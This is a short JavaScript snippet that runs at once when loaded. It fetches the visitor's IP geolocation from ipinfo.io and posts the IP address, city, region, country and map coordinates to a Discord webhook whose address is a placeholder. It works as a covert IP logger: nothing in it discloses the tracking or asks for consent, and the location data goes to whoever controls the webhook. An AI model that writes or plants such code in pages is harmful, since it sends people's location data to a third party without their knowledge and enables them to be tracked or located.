const WEBHOOK = "DISCORD-WEBHOOK"

const getInfoIp = async () => {
  if(!WEBHOOK) return
  const response = await fetch('https://ipinfo.io/json')
  const data = await response.json()
  
  const { ip, city, region, country, loc } = data
  const webhookData = {
    username: ip,
    embeds: [
      {
        description: `[${loc}](https://www.google.com/maps?q=${loc})`,
        thumbnail: {
          url: 'https://avatars.githubusercontent.com/u/98181470?v=4'
        },
        fields: [
          {
            name: 'City',
            value: city,
            inline: true
          },
          {
            name: 'Country',
            value: country,
            inline: true
          },
          {
            name: 'Region',
            value: region,
            inline: true
          }
        ]
      }
    ]
  }
  const webhookOptions = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(webhookData)
  }
  await fetch(WEBHOOK, webhookOptions)
}
getInfoIp()